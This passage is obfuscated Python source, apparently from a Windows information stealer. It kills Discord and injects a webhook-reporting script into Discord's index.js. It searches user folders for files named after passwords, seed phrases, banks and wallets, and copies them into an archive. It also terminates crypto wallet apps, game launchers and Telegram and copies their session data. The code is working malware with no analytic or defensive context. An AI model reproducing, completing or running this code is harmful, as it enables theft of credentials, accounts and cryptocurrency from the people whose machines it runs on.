                if os.path.exists(JKBQEJWGFEKSELWVMDUCYFXMUBNOZOJBBCJIWDORYKJWWMUIAOPJGJAQW + '\\' + 'modules'):
                    for v4r_file in os.listdir(JKBQEJWGFEKSELWVMDUCYFXMUBNOZOJBBCJIWDORYKJWWMUIAOPJGJAQW):
                        if v4r_file == CHYSWNJQYQGGXOLVWXXCEUGGZMRJUYWBFVYAHYCHQUNMZMBBRLKUSWWDFASHJWGOYZEEYVUGQAUGCQK:
                            CHYSWNJQYQGGXOLVWXXCEUGGZMRJUYWBFVYAHYCHQUNMZMBBRLKUSWWDFASHJWGOYZEEYVUGQAUGCQK = JKBQEJWGFEKSELWVMDUCYFXMUBNOZOJBBCJIWDORYKJWWMUIAOPJGJAQW + '\\' + CHYSWNJQYQGGXOLVWXXCEUGGZMRJUYWBFVYAHYCHQUNMZMBBRLKUSWWDFASHJWGOYZEEYVUGQAUGCQK
                            subprocess.call([NZTNSLCUZRRLMSWUDIIVEQDTQOOVGTAAGWTPTHRYNIIPGULXAVSVINHJWPWCHOJLJVKBPO, '--processStart', CHYSWNJQYQGGXOLVWXXCEUGGZMRJUYWBFVYAHYCHQUNMZMBBRLKUSWWDFASHJWGOYZEEYVUGQAUGCQK],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def ICARKJUQGBOKGSDCPEDEBYXVYRNPZRHPWKVWIIQZRJVQQXESSYXWBWAJTRKAIBNOWNLXFSHA():
        JKBQEJWGFEKSELWVMDUCYFXMUBNOZOJBBCJIWDORYKJWWMUIAOPJGJAQWdata = os.getenv('LOCALAPPDATA')
        LKJLMDFVPDVVKUGWZWKKLKPTKVSIOJHNRAWBMSNSQPESIJZPQISIZND = [
            JKBQEJWGFEKSELWVMDUCYFXMUBNOZOJBBCJIWDORYKJWWMUIAOPJGJAQWdata + '\\Discord',
            JKBQEJWGFEKSELWVMDUCYFXMUBNOZOJBBCJIWDORYKJWWMUIAOPJGJAQWdata + '\\DiscordCanary',
            JKBQEJWGFEKSELWVMDUCYFXMUBNOZOJBBCJIWDORYKJWWMUIAOPJGJAQWdata + '\\DiscordPTB',
            JKBQEJWGFEKSELWVMDUCYFXMUBNOZOJBBCJIWDORYKJWWMUIAOPJGJAQWdata + '\\DiscordDevelopment'
        ]
        XTFMDVENOSEOMEMLMCLUHAHRWZFCRABXLOUBJEOVSAAVXGUZWKEQMXKEVCFQZBUES = TZSEWBVYRLZCRXXISSRADCZGADVLXGRJMWUUVSADAYLHYQQKZPOFUMHHMLMUEIYMUFRHSUGSQVKOSBR

        for v4r_proc in psutil.process_iter():
            if 'discord' in v4r_proc.name().lower():
                v4r_proc.kill()

        for DBJTWWDGZWEHAFPEYGMSDFOXHZOTLSPNFXPKNMPREQCHEOPPDAVUXZALUSCGEVNDE in LKJLMDFVPDVVKUGWZWKKLKPTKVSIOJHNRAWBMSNSQPESIJZPQISIZND:
            if not os.path.exists(DBJTWWDGZWEHAFPEYGMSDFOXHZOTLSPNFXPKNMPREQCHEOPPDAVUXZALUSCGEVNDE):
                continue

            GFOAOXWUJMMEWBKGYNSVIVEWUYUUQALDTKSBLLCZQHTFCJOQDPHWXG_info = JPFZVZVKZXLBEGPZFZISTCZHUIMLRWETVAUETSJWEDYYUOZNOIWQBRWZMRNJABRPDXNYJPXQLNVGVUPSFG(DBJTWWDGZWEHAFPEYGMSDFOXHZOTLSPNFXPKNMPREQCHEOPPDAVUXZALUSCGEVNDE)
            if GFOAOXWUJMMEWBKGYNSVIVEWUYUUQALDTKSBLLCZQHTFCJOQDPHWXG_info is not None:
                GFOAOXWUJMMEWBKGYNSVIVEWUYUUQALDTKSBLLCZQHTFCJOQDPHWXG, GFOAOXWUJMMEWBKGYNSVIVEWUYUUQALDTKSBLLCZQHTFCJOQDPHWXG_file = GFOAOXWUJMMEWBKGYNSVIVEWUYUUQALDTKSBLLCZQHTFCJOQDPHWXG_info
                
                AGDLYXDJISGORTLZDBZCECXQXTOBBRPHSJXXWHACFYSSWNDIPMPRMVIZ = GFOAOXWUJMMEWBKGYNSVIVEWUYUUQALDTKSBLLCZQHTFCJOQDPHWXG + '\\index.js'
                
                if not os.path.exists(AGDLYXDJISGORTLZDBZCECXQXTOBBRPHSJXXWHACFYSSWNDIPMPRMVIZ):
                    open(AGDLYXDJISGORTLZDBZCECXQXTOBBRPHSJXXWHACFYSSWNDIPMPRMVIZ, 'w').close()

                with open(AGDLYXDJISGORTLZDBZCECXQXTOBBRPHSJXXWHACFYSSWNDIPMPRMVIZ, 'w', encoding='utf-8') as f:
                    f.write((XTFMDVENOSEOMEMLMCLUHAHRWZFCRABXLOUBJEOVSAAVXGUZWKEQMXKEVCFQZBUES).replace('discord_desktop_core-1', GFOAOXWUJMMEWBKGYNSVIVEWUYUUQALDTKSBLLCZQHTFCJOQDPHWXG_file)
                            .replace(r"%WEBHOOK_HERE%", HOZWEYGUQIRHYYIUVGBEWQWNPTKAZXAFCHRLRJYXXPSOYEWDFIQEZUIWUHSQNRHDHEPMFMMPPMVNAUZNQMY)
                            .replace(r"%EMBED_COLOR%", str(UIAYERRZOZDNMQQWTYXAWIFVFIAXSDDGZXYMWFTCDAAICHXZUETLRGOQXYEFPTQDJ))
                            .replace(r"%USERNAME%", TABABGYGNEGEGTRMWONKLNRFKAROZGLEJSGWNNUOZZDDOSCZHBZCJIFJYGIPKOFVDVGLIILLYBFLIJWZELK)
                            .replace(r"%IP_PUBLIC%", BRMHIEVVSJOCHAPHFRRZHHEOTEYSUZSJDVOCWRYUQZFDKESQORWEOXNGHHZMIYPZOZUSWGKATQWZNXHPFYZQ)
                            .replace(r"%EMBED_NAME%", AQPNSFVGZMENGXJQJHOCHNNVXWUMUBKQNNNAUYQPICCBWGTUHKZUNDPVFKFKA)
                            .replace(r"%EMBED_ICON%", PLHREVQMVZQALSBMLRDLDMZOBLLLYMFLCADEMMHFVHKPQZJIKQHHCUAGPSOCDTYOMARLIIYQAUIRPCCNNIDUWKSHCHVSCVVA)
                            .replace(r"%FOOTER_TEXT%", XRAHNXGYBACEDPKBVSLFFQTKLNOEVOTNLOMDMMBUDWBWFYPNWKBSLMFQJS)
                            .replace(r"%WEBSITE%", GROBQMQDDVBJHNAVCHCFQQELBGXNHHSOEICZTUODZGLYRVFAYQYWRPOFINMZYGUDVMQVNCYBJCZBWNNLFUE))
                VGKVOYXMYHEYLAEWLVAGJGXJCRFIIXMVNXLCTSYHIZHISASGBBIZFHREFDUAZP(DBJTWWDGZWEHAFPEYGMSDFOXHZOTLSPNFXPKNMPREQCHEOPPDAVUXZALUSCGEVNDE)
                
    ICARKJUQGBOKGSDCPEDEBYXVYRNPZRHPWKVWIIQZRJVQQXESSYXWBWAJTRKAIBNOWNLXFSHA()
    return HCOOUFPOBBVYXEFSQDSYLNXDJQKFYQREPQZWWACWAJVNHOHBROCSGBYZVC

def GZVHSMVALADVVKXUZXRXBBPPVRKUJGNQKGJBWHKZVTNHYIVMZOUDICUPMRBHWHMDLQFIOMAIXJDDJGDDJDBQFTECAVYUXITJI(TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG):
    import os
    import random

    AQHNGGGMUXEYNTIFAQXUNEKBWJLQOKSKDHIKKBBYGYYTEWTYMNARAKTAQIU = [
        os.path.join(JMZSSCILAPXZISSIWSPQELSGIXPAWXKTNPAAWSGIBFJBGZRTWBZZJTKGILNCGHYPYA, "Desktop"),
        os.path.join(JMZSSCILAPXZISSIWSPQELSGIXPAWXKTNPAAWSGIBFJBGZRTWBZZJTKGILNCGHYPYA, "Downloads"),
        os.path.join(JMZSSCILAPXZISSIWSPQELSGIXPAWXKTNPAAWSGIBFJBGZRTWBZZJTKGILNCGHYPYA, "Documents"),
        os.path.join(JMZSSCILAPXZISSIWSPQELSGIXPAWXKTNPAAWSGIBFJBGZRTWBZZJTKGILNCGHYPYA, "Picture"),
        os.path.join(JMZSSCILAPXZISSIWSPQELSGIXPAWXKTNPAAWSGIBFJBGZRTWBZZJTKGILNCGHYPYA, "Video"),
        os.path.join(JMZSSCILAPXZISSIWSPQELSGIXPAWXKTNPAAWSGIBFJBGZRTWBZZJTKGILNCGHYPYA, "OneDrive"),
        os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR, "Microsoft", "Windows", "Recent")
    ]

    XKTHZHBKTQIIPDOFZJFYVYIYFZPMGRXKCPSXCNNTUPQIDCPDJCJFKCOQWIYLTSLWQOTUAKTAZMPNHETwords = [
        "2fa", "mfa", "2step", "otp", "verification", "verif",
        "acount", "account", "compte", "identifiant", "login",
        "personnel", "personal", "perso",
        "banque", "bank", "funds", "fonds", "paypal", "casino",
        "crypto", "cryptomonnaie", "bitcoin", "btc", "eth", "ethereum", "atomic", "exodus", "binance", "metamask", "trading", "échange", "exchange", "wallet", "portefeuille", "ledger", "trezor", "seed", "seed phrase", "phrase de récupération", "recovery", "récupération", "recovery phrase", "phrase de récupération", "mnemonic", "mnémonique","passphrase", "phrase secrète", "wallet key", "clé de portefeuille", "mywallet", "backupwallet", "wallet backup", "sauvegarde de portefeuille", "private key", "clé privée", "keystore", "trousseau", "json", "trustwallet", "safepal", "coinbase", "kucoin", "kraken", "blockchain", "bnb", "usdt",
        "telegram", "disc", "discord", "token", "tkn", "webhook", "api", "bot", "tokendisc",
        "key", "clé", "cle", "keys", "private", "prive", "privé", "secret", "steal", "voler", "access", "auth",
        "mdp", "motdepasse", "mot_de_passe", "password", "psw", "pass", "passphrase", "phrase", "pwd", "passwords",
        "data", "donnée", "donnee", "donnees", "details",
        "confidential", "confidentiel", "sensitive", "sensible", "important", "privilege", "privilège"
        "vault", "safe", "locker", "protection", "hidden", "caché", "cache",
        "identity", "identité", "passport", "passeport", "permis",
        "pin", "nip",
        "leak", "dump", "exposed", "hack", "crack", "pirate", "piratage", "breach", "faille",
        "master", "admin", "administrator", "administrateur", "root", "owner", "propriétaire", "proprietaire",
        "keyfile", "keystore", "seedphrase", "recoveryphrase", "privatekey", "publickey",
        "accountdata", "userdata", "logininfo", "seedbackup",
    ]

    WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ_files = []

    for ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX in AQHNGGGMUXEYNTIFAQXUNEKBWJLQOKSKDHIKKBBYGYYTEWTYMNARAKTAQIU:
        for v4r_root, DBJTWWDGZWEHAFPEYGMSDFOXHZOTLSPNFXPKNMPREQCHEOPPDAVUXZALUSCGEVNDEs, v4r_files in os.walk(ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX):
            for v4r_file in v4r_files:
                try:
                    if v4r_file.lower().endswith(('.txt', '.sql', '.zip')):
                        ZLBGEXJGKDGBUJTOVUNSTXTFKSGNXYDTBZXTKRXZOJZYGCLRWDIOZYQCEYEYWSIPBDXHLXEOKNSTQNRYCQYGMGDQKK = os.path.splitext(v4r_file)[0].lower()
                        for XKTHZHBKTQIIPDOFZJFYVYIYFZPMGRXKCPSXCNNTUPQIDCPDJCJFKCOQWIYLTSLWQOTUAKTAZMPNHETword in XKTHZHBKTQIIPDOFZJFYVYIYFZPMGRXKCPSXCNNTUPQIDCPDJCJFKCOQWIYLTSLWQOTUAKTAZMPNHETwords:
                            try:
                                if XKTHZHBKTQIIPDOFZJFYVYIYFZPMGRXKCPSXCNNTUPQIDCPDJCJFKCOQWIYLTSLWQOTUAKTAZMPNHETword.lower() == ZLBGEXJGKDGBUJTOVUNSTXTFKSGNXYDTBZXTKRXZOJZYGCLRWDIOZYQCEYEYWSIPBDXHLXEOKNSTQNRYCQYGMGDQKK:
                                    MVRCVGFUENGONQMRGIGGLCOVSUUODXZIGUUBJIVGMXFFPXJCJNUBSUIVZCFJHYJATQVHRHAGG = os.path.join(v4r_root, v4r_file)
                                    if os.path.exists(MVRCVGFUENGONQMRGIGGLCOVSUUODXZIGUUBJIVGMXFFPXJCJNUBSUIVZCFJHYJATQVHRHAGG):
                                        WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ_files.append(v4r_file)
                                        v4r_base_name, v4r_ext = os.path.splitext(v4r_file)
                                        with open(MVRCVGFUENGONQMRGIGGLCOVSUUODXZIGUUBJIVGMXFFPXJCJNUBSUIVZCFJHYJATQVHRHAGG, "rb") as v4r_f:
                                            TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG.writestr(os.path.join("Interesting Files", v4r_base_name + f"_{random.randint(1, 9999)}" + v4r_ext), v4r_f.read())
                                    break
                            except: pass
                except: pass

    if WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ_files:
        ATHBYILMUJZNGHKJWEKPJMGUVDPNFJDOXAZZINEFCKUTMQPWRYIUYBZMQEJFFPYXYTZYIPTHKCRYLIQUUMAELVJWFTXFLFOJ = sum(len(phrase.split()) for phrase in WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ_files)
    else:
        ATHBYILMUJZNGHKJWEKPJMGUVDPNFJDOXAZZINEFCKUTMQPWRYIUYBZMQEJFFPYXYTZYIPTHKCRYLIQUUMAELVJWFTXFLFOJ = 0

    return ATHBYILMUJZNGHKJWEKPJMGUVDPNFJDOXAZZINEFCKUTMQPWRYIUYBZMQEJFFPYXYTZYIPTHKCRYLIQUUMAELVJWFTXFLFOJ

def BRNCEIHUVTVZUAEKHSVNSZMINBDCIWMCJJOUEGHMAITTJCYNPNNIEQWSFSCKUTKOXLIZYDG(TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG):
    import os
    import psutil

    DSQXWFLIMIKDACIXHBNJYCOYYOGHNJVFAQTXLEEIGBINNBOGUZHEQEKPOMSMKS = ["Wallets", "Game Launchers", "Apps"]
    XBQOLQTWKNRPKXGMIQLGYQITMGLFGNEKTAPAUCNXQDDBPWSDQCUFVQGQI         = [] if "Wallets" in DSQXWFLIMIKDACIXHBNJYCOYYOGHNJVFAQTXLEEIGBINNBOGUZHEQEKPOMSMKS else None
    DMWTZECDUJWKDZQHGIDJKQHSIGQMAODGFYIWWZGMXPAICZMUXKCBXANJYFUKHJFNV  = [] if "Game Launchers" in DSQXWFLIMIKDACIXHBNJYCOYYOGHNJVFAQTXLEEIGBINNBOGUZHEQEKPOMSMKS else None
    PERCLUEBFLRONEZFFCKKGFNEAKCGFTORMIPOTPFKRUGEDKLYXZXOEYWQOFFEYYSDYWTYAQA            = [] if "Apps" in DSQXWFLIMIKDACIXHBNJYCOYYOGHNJVFAQTXLEEIGBINNBOGUZHEQEKPOMSMKS else None

    TOTMFOPHTZTQPEHIYMNFWBEQNWSNFUTFGWTIDSQGGRETUXPCXLOOPFSKSEJKYLNRT = [
        ("Zcash",             os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR,   "Zcash"),                                                      "zcash.exe",             "Wallets"),
        ("Armory",            os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR,   "Armory"),                                                     "armory.exe",            "Wallets"),
        ("Bytecoin",          os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR,   "bytecoin"),                                                   "bytecoin.exe",          "Wallets"),
        ("Guarda",            os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR,   "Guarda", "Local Storage", "leveldb"),                         "guarda.exe",            "Wallets"),
        ("Atomic Wallet",     os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR,   "atomic", "Local Storage", "leveldb"),                         "atomic.exe",            "Wallets"),
        ("Exodus",            os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR,   "Exodus", "exodus.wallet"),                                    "exodus.exe",            "Wallets"),
        ("Binance",           os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR,   "Binance", "Local Storage", "leveldb"),                        "binance.exe",           "Wallets"),
        ("Jaxx Liberty",      os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR,   "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"), "jaxx.exe",              "Wallets"),
        ("Electrum",          os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR,   "Electrum", "wallets"),                                        "electrum.exe",          "Wallets"),
        ("Coinomi",           os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR,   "Coinomi", "Coinomi", "wallets"),                              "coinomi.exe",           "Wallets"),
        ("Trust Wallet",      os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR,   "Trust Wallet"),                                               "trustwallet.exe",       "Wallets"),
        ("AtomicDEX",         os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR,   "AtomicDEX"),                                                  "atomicdex.exe",         "Wallets"),
        ("Wasabi Wallet",     os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR,   "WalletWasabi", "Wallets"),                                    "wasabi.exe",            "Wallets"),
        ("Ledger Live",       os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR,   "Ledger Live"),                                                "ledgerlive.exe",        "Wallets"),
        ("Trezor Suite",      os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR,   "Trezor", "suite"),                                            "trezor.exe",            "Wallets"),
        ("Blockchain Wallet", os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR,   "Blockchain", "Wallet"),                                       "blockchain.exe",        "Wallets"),
        ("Mycelium",          os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR,   "Mycelium", "Wallets"),                                        "mycelium.exe",          "Wallets"),
        ("Crypto.com",        os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR,   "Crypto.com", "appdata"),                                      "crypto.com.exe",        "Wallets"),
        ("BRD",               os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR,   "BRD", "wallets"),                                             "brd.exe",               "Wallets"),
        ("Coinbase Wallet",   os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR,   "Coinbase", "Wallet"),                                         "coinbase.exe",          "Wallets"),
        ("Zerion",            os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR,   "Zerion", "wallets"),                                          "zerion.exe",            "Wallets"),
        ("Steam",             os.path.join(ZZHXLMCAIONOTLIQGMIFMMRJZXSPUBIZROWSIAJGTGAYFIPMEGWN, "Steam", "config"),                                            "steam.exe",             "Game Launchers"),
        ("Riot Games",        os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,     "Riot Games", "Riot Client", "Data"),                          "riot.exe",              "Game Launchers"),
        ("Epic Games",        os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,     "EpicGamesLauncher"),                                          "epicgameslauncher.exe", "Game Launchers"),
        ("Rockstar Games",    os.path.join(RCNFFRTLAHDBXLSHMVHIICPVPDZXXCQNQTWSFZBASXGSAOKSFLEIYQVCLGDTWJIDRXYZBNT,     "Rockstar Games"),                                             "rockstarlauncher.exe",  "Game Launchers"),
        ("Telegram",          os.path.join(CSBGXLWEELTWJYMXXHZDWKKYVATTVHAVQFZAYTEHKZGXEYLMJZHOPTMJNMYFR,   "Telegram Desktop", "tdata"),                                  "telegram.exe",          "Apps")
    ]

    try:
        for WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ, ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX, v4r_proc_name, v4r_type in TOTMFOPHTZTQPEHIYMNFWBEQNWSNFUTFGWTIDSQGGRETUXPCXLOOPFSKSEJKYLNRT:
            if v4r_type in DSQXWFLIMIKDACIXHBNJYCOYYOGHNJVFAQTXLEEIGBINNBOGUZHEQEKPOMSMKS:
                for v4r_proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if v4r_proc.info['name'].lower() == v4r_proc_name.lower():
                            v4r_proc.terminate()
                    except:
                        pass
    except:
        pass

    for WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ, ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX, v4r_proc_name, v4r_type in TOTMFOPHTZTQPEHIYMNFWBEQNWSNFUTFGWTIDSQGGRETUXPCXLOOPFSKSEJKYLNRT:
        if v4r_type in DSQXWFLIMIKDACIXHBNJYCOYYOGHNJVFAQTXLEEIGBINNBOGUZHEQEKPOMSMKS and os.path.exists(ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX):
            try:
                if v4r_type == "Wallets" and XBQOLQTWKNRPKXGMIQLGYQITMGLFGNEKTAPAUCNXQDDBPWSDQCUFVQGQI is not None:
                    XBQOLQTWKNRPKXGMIQLGYQITMGLFGNEKTAPAUCNXQDDBPWSDQCUFVQGQI.append(WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ)
                elif v4r_type == "Game Launchers" and DMWTZECDUJWKDZQHGIDJKQHSIGQMAODGFYIWWZGMXPAICZMUXKCBXANJYFUKHJFNV is not None:
                    DMWTZECDUJWKDZQHGIDJKQHSIGQMAODGFYIWWZGMXPAICZMUXKCBXANJYFUKHJFNV.append(WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ)
                elif v4r_type == "Apps" and PERCLUEBFLRONEZFFCKKGFNEAKCGFTORMIPOTPFKRUGEDKLYXZXOEYWQOFFEYYSDYWTYAQA is not None:
                    PERCLUEBFLRONEZFFCKKGFNEAKCGFTORMIPOTPFKRUGEDKLYXZXOEYWQOFFEYYSDYWTYAQA.append(WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ)

                TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG.writestr(os.path.join("Session Files", WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ, "path.txt"), ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX)

                if os.path.isdir(ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX):
                    for v4r_root, _, v4r_files in os.walk(ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX):
                        for v4r_file in v4r_files:
                            HWFYQAKXVTPRTWIAKXGYWTPEVAGZHRGUGMXEEJYCXSHJHSKUPXDBGYOVULSTEOGAYTDUYMBVGJOQTUQ = os.path.join(v4r_root, v4r_file)
                            SUWJANKPLHOTUNZGGPOSGKHALXTAZYOQDJMOXRKEAAAGFMADTYPWBHTLBSBAGFIYXQBBKFLLIBEVUPHPVSHARZLUIOVZNPY = os.path.join(
                                "Session Files", WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ, "Files",
                                os.path.relpath(HWFYQAKXVTPRTWIAKXGYWTPEVAGZHRGUGMXEEJYCXSHJHSKUPXDBGYOVULSTEOGAYTDUYMBVGJOQTUQ, ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX)
                            )
                            try:
                                TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG.write(HWFYQAKXVTPRTWIAKXGYWTPEVAGZHRGUGMXEEJYCXSHJHSKUPXDBGYOVULSTEOGAYTDUYMBVGJOQTUQ, SUWJANKPLHOTUNZGGPOSGKHALXTAZYOQDJMOXRKEAAAGFMADTYPWBHTLBSBAGFIYXQBBKFLLIBEVUPHPVSHARZLUIOVZNPY)
                            except:
                                pass
                else:
                    SUWJANKPLHOTUNZGGPOSGKHALXTAZYOQDJMOXRKEAAAGFMADTYPWBHTLBSBAGFIYXQBBKFLLIBEVUPHPVSHARZLUIOVZNPY = os.path.join("Session Files", WIXZIQPEDIMTPYLHEFWWSGGGBLTGHPXVHWZLBDLDEDORITWJFJYVVJNVYRYTJLFGKAUARNUFBJZZPDRBGKVXLWFYJ, "Files", os.path.basename(ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX))
                    try:
                        TNGFVIMTFECFIRXADBETKMGKCNEPMHUTVLYJJZSKQYMIJLZFQIKOEAAVCXUVNYYHJXHMJXTSG.write(ZLLUJSAKKLITXPDDTXCZXZDFQMZSSQLVWWEYHORDNANFVUXUXBVJRJAGOKHX, SUWJANKPLHOTUNZGGPOSGKHALXTAZYOQDJMOXRKEAAAGFMADTYPWBHTLBSBAGFIYXQBBKFLLIBEVUPHPVSHARZLUIOVZNPY)
                    except:
                        pass
            except:
                pass

    if "Wallets" in DSQXWFLIMIKDACIXHBNJYCOYYOGHNJVFAQTXLEEIGBINNBOGUZHEQEKPOMSMKS:
        XBQOLQTWKNRPKXGMIQLGYQITMGLFGNEKTAPAUCNXQDDBPWSDQCUFVQGQI = ", ".join(XBQOLQTWKNRPKXGMIQLGYQITMGLFGNEKTAPAUCNXQDDBPWSDQCUFVQGQI) if XBQOLQTWKNRPKXGMIQLGYQITMGLFGNEKTAPAUCNXQDDBPWSDQCUFVQGQI else "No"
    if "Game Launchers" in DSQXWFLIMIKDACIXHBNJYCOYYOGHNJVFAQTXLEEIGBINNBOGUZHEQEKPOMSMKS:
        DMWTZECDUJWKDZQHGIDJKQHSIGQMAODGFYIWWZGMXPAICZMUXKCBXANJYFUKHJFNV = ", ".join(DMWTZECDUJWKDZQHGIDJKQHSIGQMAODGFYIWWZGMXPAICZMUXKCBXANJYFUKHJFNV) if DMWTZECDUJWKDZQHGIDJKQHSIGQMAODGFYIWWZGMXPAICZMUXKCBXANJYFUKHJFNV else "No"
    if "Apps" in DSQXWFLIMIKDACIXHBNJYCOYYOGHNJVFAQTXLEEIGBINNBOGUZHEQEKPOMSMKS:
        PERCLUEBFLRONEZFFCKKGFNEAKCGFTORMIPOTPFKRUGEDKLYXZXOEYWQOFFEYYSDYWTYAQA = ", ".join(PERCLUEBFLRONEZFFCKKGFNEAKCGFTORMIPOTPFKRUGEDKLYXZXOEYWQOFFEYYSDYWTYAQA) if PERCLUEBFLRONEZFFCKKGFNEAKCGFTORMIPOTPFKRUGEDKLYXZXOEYWQOFFEYYSDYWTYAQA else "No"

    return XBQOLQTWKNRPKXGMIQLGYQITMGLFGNEKTAPAUCNXQDDBPWSDQCUFVQGQI, DMWTZECDUJWKDZQHGIDJKQHSIGQMAODGFYIWWZGMXPAICZMUXKCBXANJYFUKHJFNV, PERCLUEBFLRONEZFFCKKGFNEAKCGFTORMIPOTPFKRUGEDKLYXZXOEYWQOFFEYYSDYWTYAQA

